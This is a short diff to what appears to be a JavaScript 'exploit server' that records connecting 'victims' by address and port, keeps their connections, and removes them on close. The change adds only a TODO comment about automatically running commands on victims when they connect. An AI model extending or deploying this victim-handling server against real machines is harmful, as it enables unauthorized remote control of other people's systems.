@@ -78,6 +78,7 @@ function main() {
         const vic_name = req.connection.remoteAddress + ':' + req.connection.remotePort
         victims[vic_name] = conn
         console.log('New victim ' + vic_name)
+        // TODO Implement the ability to automatically run commands on connect
         conn.on('close', () => delete victims[vic_name])
     })
     console.log('Exploit server running on port ' + EXPLOIT_PORT)
